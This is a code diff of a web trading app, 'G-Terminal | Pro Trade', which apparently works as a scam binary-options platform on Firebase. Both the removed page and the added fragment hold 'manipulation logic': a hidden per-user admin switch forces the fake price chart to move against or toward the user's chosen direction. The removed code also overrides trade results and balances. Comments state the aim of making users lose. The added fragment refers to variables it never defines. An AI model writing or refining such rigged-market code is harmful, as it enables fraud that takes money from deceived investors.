@@ -1,166 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>G-Terminal | Pro Trade</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
-    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
-    <style>
-        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f6465d; --text: #ffffff; }
-        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 10px; overflow: hidden; }
-        
-        #chart-container { height: 380px; width: 100%; background: #161a1e; border: 1px solid #2b3139; border-radius: 12px; position: relative; }
-        .price-label { position: absolute; top: 15px; left: 15px; z-index: 10; font-size: 2rem; font-weight: bold; font-family: monospace; }
-        
-        .controls { background: var(--card); padding: 15px; border-radius: 15px; margin-top: 10px; border: 1px solid #2b3139; }
-        #timer-ring { text-align: center; color: var(--yellow); font-size: 1.2rem; font-weight: bold; margin-bottom: 5px; }
-        
-        input { width: 100%; padding: 12px; margin: 5px 0; background: #2b3139; border: 1px solid #474d57; color: white; border-radius: 8px; outline: none; }
-        .btn-up { background: var(--green); width: 48%; padding: 15px; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; }
-        .btn-down { background: var(--red); width: 48%; padding: 15px; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; }
-
-        /* Result Popup */
-        #result-overlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
-            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; 
-        }
-        .res-img { width: 150px; margin-bottom: 20px; }
-        .res-text { font-size: 2rem; font-weight: bold; }
-    </style>
-</head>
-<body>
-
-    <div id="result-overlay">
-        <img id="res-icon" src="" class="res-img">
-        <div id="res-status" class="res-text"></div>
-        <div id="res-amount" style="font-size: 1.5rem; color: var(--yellow);"></div>
-        <button onclick="closeResult()" style="margin-top:20px; padding:10px 30px; background:var(--yellow); border:none; border-radius:5px; font-weight:bold;">Continue</button>
-    </div>
-
-    <div id="chart-container">
-        <div class="price-label" id="live-val">0.00</div>
-    </div>
-
-    <div class="controls">
-        <div id="timer-ring">Market Live</div>
-        <input type="number" id="t-amount" placeholder="Investment ($)">
-        <div style="display:flex; justify-content: space-between;">
-            <button class="btn-up" onclick="goTrade('UP')">CALL (UP)</button>
-            <button class="btn-down" onclick="goTrade('DOWN')">PUT (DOWN)</button>
-        </div>
-    </div>
-
-<script>
-    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const auth = firebase.auth();
-
-    // Chart Setup
-    const chart = LightweightCharts.createChart(document.getElementById('chart-container'), {
-        layout: { backgroundColor: '#161a1e', textColor: '#d1d4dc' },
-        grid: { vertLines: { visible: false }, horzLines: { color: '#2b3139' } },
-        timeScale: { timeVisible: true, secondsVisible: true }
-    });
-    const lineSeries = chart.addLineSeries({ color: '#02c076', lineWidth: 3 });
-
-    let currentPrice = 65420.10;
-    let isActive = false;
-    let entryPrice = 0;
-    let adminMode = "NORMAL";
-    let entryLine;
-
-    // Real-time Loop with Manipulation
-    setInterval(() => {
-        let drift = (Math.random() - 0.5) * 8;
-
-        if (isActive) {
-            if (adminMode === "WIN") drift = Math.abs(drift) + 3; // Force Jerk UP
-            if (adminMode === "LOSS") drift = -Math.abs(drift) - 3; // Force Jerk DOWN
-        }
-
-        currentPrice += drift;
-        document.getElementById('live-val').innerText = currentPrice.toFixed(2);
-        document.getElementById('live-val').style.color = drift > 0 ? "#02c076" : "#f6465d";
-        lineSeries.update({ time: Math.floor(Date.now() / 1000), value: currentPrice });
-    }, 1000);
-
-    // Sync Admin
-    auth.onAuthStateChanged(user => {
-        if(user) db.ref('users/'+user.uid+'/control').on('value', s => adminMode = s.val() || "NORMAL");
-    });
-
-    function goTrade(dir) {
-        const user = auth.currentUser;
-        const amt = parseFloat(document.getElementById('t-amount').value);
-        if(!user || !amt) return alert("Check Login/Amount");
-
-        db.ref('users/'+user.uid).once('value', snap => {
-            const bal = snap.val().balance;
-            if(amt > bal) return alert("Low Balance");
-
-            // 1. Mark Entry on Chart
-            isActive = true;
-            entryPrice = currentPrice;
-            entryLine = lineSeries.createPriceLine({
-                price: entryPrice,
-                color: '#f0b90b',
-                lineWidth: 2,
-                lineStyle: LightweightCharts.LineStyle.Dashed,
-                axisLabelVisible: true,
-                title: 'ENTRY',
-            });
-
-            // 2. Deduct and Timer
-            db.ref('users/'+user.uid).update({ balance: bal - amt });
-            let time = 30; // Short trade for test
-            const timer = setInterval(() => {
-                time--;
-                document.getElementById('timer-ring').innerText = "Closing in: "+time+"s";
-                if(time <= 0) {
-                    clearInterval(timer);
-                    showResult(user.uid, dir, amt, bal);
-                }
-            }, 1000);
-        });
-    }
-
-    function showResult(uid, dir, amt, oldBal) {
-        isActive = false;
-        lineSeries.removePriceLine(entryLine); // Remove Marker
-        
-        let win = false;
-        if(adminMode === "WIN") win = true;
-        else if(adminMode === "LOSS") win = false;
-        else win = (dir === 'UP') ? (currentPrice > entryPrice) : (currentPrice < entryPrice);
-
-        const overlay = document.getElementById('result-overlay');
-        const icon = document.getElementById('res-icon');
-        const status = document.getElementById('res-status');
-        const amountTxt = document.getElementById('res-amount');
-
-        if(win) {
-            let profit = amt * 1.85;
-            db.ref('users/'+uid).update({ balance: (oldBal - amt) + profit });
-            icon.src = "https://cdn-icons-png.flaticon.com/512/148/148767.png"; // Success Icon
-            status.innerText = "YOU WON!";
-            status.style.color = "var(--green)";
-            amountTxt.innerText = "+$" + (amt * 0.85).toFixed(2);
+// --- POWER MANIPULATION LOGIC (POSITION BASED) ---
+if (isActive) {
+    // 'userDir' woh direction hai jo user ne select ki (UP ya DOWN)
+    
+    if (adminMode === "WIN") {
+        if (userDir === 'UP') {
+            drift = Math.abs(drift) + 15; // User ne UP kaha, to forcefully UP le jao
         } else {
-            icon.src = "https://cdn-icons-png.flaticon.com/512/6659/6659895.png"; // Loss Icon
-            status.innerText = "TRADE LOST";
-            status.style.color = "var(--red)";
-            amountTxt.innerText = "-$" + amt.toFixed(2);
+            drift = -Math.abs(drift) - 15; // User ne DOWN kaha, to forcefully DOWN le jao
         }
-        overlay.style.display = "flex";
+    } 
+    else if (adminMode === "LOSS") {
+        if (userDir === 'UP') {
+            drift = -Math.abs(drift) - 15; // User ne UP kaha, use haraane ke liye DOWN le jao
+        } else {
+            drift = Math.abs(drift) + 15; // User ne DOWN kaha, use haraane ke liye UP le jao
+        }
     }
+}
 
-    function closeResult() {
-        document.getElementById('result-overlay').style.display = "none";
-        document.getElementById('timer-ring').innerText = "Market Live";
-    }
-</script>
-</body>
-</html>
+// Candle update logic
+let close = open + drift;
+candleSeries.update({
+    time: currentTime,
+    open: open,
+    high: Math.max(open, close, open + 5),
+    low: Math.min(open, close, open - 5),
+    close: close
+});
